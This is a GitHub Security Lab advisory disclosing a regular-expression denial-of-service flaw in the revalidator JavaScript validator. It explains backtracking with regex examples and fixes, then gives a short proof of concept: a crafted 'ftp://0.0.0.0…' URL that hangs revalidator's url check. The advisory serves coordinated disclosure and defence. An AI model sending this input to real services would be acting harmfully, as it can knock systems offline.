<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">April 13, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-352: ReDoS (Regular Expression Denial of Service) in revalidator</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/ghsecuritylab">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/61799930?s=35" height="35" width="35">
        <span>GitHub Security Lab</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      
<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>

<ul>
  <li>12/22/2020: Report sent to the maintainer</li>
  <li>12/22/2020: Maintainer email bounced</li>
  <li>02/24/2021: Created issue on the project asking for a security contact</li>
  <li>04/08/2021: Disclosure deadline expired</li>
  <li>04/15/2021: Publication as per our <a href="https://securitylab.github.com/advisories/#policy">disclosure policy</a>.</li>
</ul>

<h2 id="summary">Summary</h2>

<p>The project contains one or more regular expressions that are vulnerable to <a href="https://en.wikipedia.org/wiki/ReDoS">ReDoS</a> (Regular Expression Denial of Service)</p>

<h2 id="product">Product</h2>

<p>revalidator</p>

<h2 id="tested-version">Tested Version</h2>

<p>Latest commit at the time of reporting (December 21, 2020).</p>

<h2 id="details">Details</h2>

<h3 id="redos">ReDoS</h3>

<p>ReDoS, or Regular Expression Denial of Service, is a vulnerability affecting poorly constructed and potentially inefficient regular expressions which can make them perform extremely badly given a creatively constructed input string.</p>

<p>For the specific regular expression reported, it is possible to force it to work with an <code class="language-plaintext highlighter-rouge">O(2^n)</code> runtime performance when there is <a href="http://en.wikipedia.org/wiki/ReDoS#Exponential_backtracking">exponential backtracking</a>.</p>

<p>ReDoS can be caused by ambiguity or overlapping between some regex clauses. These badly performing regular expressions can become a security issue if a user can control the input. For example if the project is an input validation library, then the project could be used by a server to validate untrusted user input. There is no one size fits all when it comes to fixing ReDoS. But in general it is about removing ambiguity/overlap inside the regular expression.</p>

<p>Before showing the vulnerable regex, it may be helpful to show some examples of regular expressions vulnerable to ReDoS and how to fix them. If you are familiar with this vulnerability and how to fix it, please skip this section.</p>

<hr />

<pre><code class="language-JavaScript">var reg = /&lt;!--(.|\s)*?--&gt;/g;
</code></pre>

<p>The above regular expression matches the start of an HTML comment, followed by any characters, followed by the end of a HTML comment.
The dot in the regular expression (<code class="language-plaintext highlighter-rouge">.</code>) matches any char except newlines, and <code class="language-plaintext highlighter-rouge">\s</code> matches any whitespace.
Both <code class="language-plaintext highlighter-rouge">.</code> and <code class="language-plaintext highlighter-rouge">\s</code> matches whitespace such as the space character.
There are therefore many possible ways for this regular expression to match a sequence of spaces.
This becomes a problem if the input is a string that starts with <code class="language-plaintext highlighter-rouge">&lt;!--</code> followed by a long sequence of spaces, because the regular expression evaluator will try every possible way of matching the spaces 
(see this debugging session for an example: https://regex101.com/r/XvYgkN/1/debugger).</p>

<p>The fix is to remove the ambiguity, which can be done by changing the regular expression to the below, where there is no overlap between the different elements of the regular expression.</p>

<pre><code class="language-JavaScript">var reg = /&lt;!--(.|\r|\n)*?--&gt;/g;
</code></pre>

<hr />

<pre><code class="language-JavaScript">var reg = /(\w+_?)+_(\d+)/;
</code></pre>

<p>The above matches a snake_case identifier that ends with some digits.
However, for a string starting with lots of letters, there many ways for the regular expression to match those letters, due to the regex having a repetition matching letters (<code class="language-plaintext highlighter-rouge">w+</code>) inside another repetition that can match letters (<code class="language-plaintext highlighter-rouge">(\w+_?)+</code>).
The regular expression evaluator will try every possible grouping of letters into smaller groups of letters (see this debugging session for an example: https://regex101.com/r/fmci1j/1/debugger).
The fix is again to remove ambiguity, by changing the inner repetition to match groups of letters that must end with an underscore.</p>

<pre><code class="language-JavaScript">var reg = /(\w+_)+(\d+)/;
</code></pre>

<hr />

<p>Often the regular expressions are not as simple as the examples above.
Like the below regular expression <a href="https://github.com/microsoft/vscode/pull/109964/files">that used to be part of VS Code</a>.
(the top regular expression is the vulnerable, the bottom is the fixed)</p>

<pre><code class="language-JavaScript">var linkPattern = /(\[((!\[[^\]]*?\]\(\s*)([^\s\(\)]+?)\s*\)\]|(?:\\\]|[^\]])*\])\(\s*)(([^\s\(\)]|\(\S*?\))+)\s*(".*?")?\)/g;
var linkPattern = /(\[((!\[[^\]]*?\]\(\s*)([^\s\(\)]+?)\s*\)\]|(?:\\\]|[^\]])*\])\(\s*)(([^\s\(\)]|\([^\s\(\)]*?\))+)\s*(".*?")?\)/g;
</code></pre>

<p>But this example is actually very similar to the first example.
A section of the regular expression that was too general (<code class="language-plaintext highlighter-rouge">\S</code>) was changed to something a bit more specific (<code class="language-plaintext highlighter-rouge">[^\s\(\)]</code>) to remove overlap with another part of the regular expression.</p>

<hr />

<h3 id="vulnerability">Vulnerability</h3>

<p>Revalidator is a cross-browser / node.js validator.</p>

<p>This issue was detected using the <a href="https://lgtm.com/query/385885563138382094/">following CodeQL query</a>.</p>

<p>PoC:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">npm install revalidator</code></li>
  <li>Run the below with <code class="language-plaintext highlighter-rouge">node</code>.</li>
</ul>

<pre><code class="language-JavaScript">var revalidator = require('revalidator');

var myObj = {
    url: "ftp://0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0."
}

console.log(revalidator.validate(myObj, {
    properties: {
        url: {
            description: 'the url the object should be stored at',
            type: 'string',
            format: 'url',
            required: true
        }
    }
}));
</code></pre>

<h3 id="impact">Impact</h3>

<p>This issue may lead to a denial of service.</p>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GitHub team member <a href="https://github.com/erik-krogh">@erik-krogh (Erik Krogh Kristensen)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2020-352</code> in any communication regarding this issue.</p>


    